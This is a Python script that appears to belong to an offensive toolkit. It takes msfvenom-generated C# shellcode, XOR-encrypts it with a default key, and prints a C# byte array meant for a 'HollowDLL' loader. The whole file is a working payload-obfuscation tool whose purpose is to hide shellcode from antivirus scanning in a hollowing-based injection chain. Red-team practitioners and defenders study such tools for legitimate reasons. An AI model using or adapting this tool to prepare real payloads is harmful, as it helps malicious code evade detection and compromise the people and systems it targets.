import re
import argparse
import sys

def main():
    parser = argparse.ArgumentParser(description="XOR Encrypt msfvenom C# shellcode for HollowDLL.")
    parser.add_argument("-i", "--input", help="Path to the file containing C# shellcode", required=True)
    parser.add_argument("-k", "--key", help="XOR Key (default: 3drtghy)", default="3drtghy")
    args = parser.parse_args()

    try:
        with open(args.input, "r") as f:
            content = f.read()
    except Exception as e:
        print(f"Error reading file: {e}")
        sys.exit(1)

    # 1. Extract hex values (0xXX) from the C# input
    hex_values = re.findall(r'0x[0-9a-fA-F]{2}', content)
    if not hex_values:
        print("No shellcode found in the provided format.")
        return

    # Convert hexadecimal strings to integer values
    bytes_list = [int(h, 16) for h in hex_values]
    key = args.key
    key_len = len(key)

    # 2. XOR Encryption
    encrypted_bytes = []
    for i in range(len(bytes_list)):
        # byte ^ key[i % key_len]
        val = bytes_list[i] ^ ord(key[i % key_len])
        encrypted_bytes.append(val)

    # 3. Format for C# Output
    hex_strings = [f"0x{b:02x}" for b in encrypted_bytes]
    formatted_payload = ", ".join(hex_strings)
    
    length = len(encrypted_bytes)
    print(f"// XOR Key: {key}")
    print(f"byte[] encryptedShellcode = new byte[{length}] {{ {formatted_payload} }};")

if __name__ == "__main__":
    main()
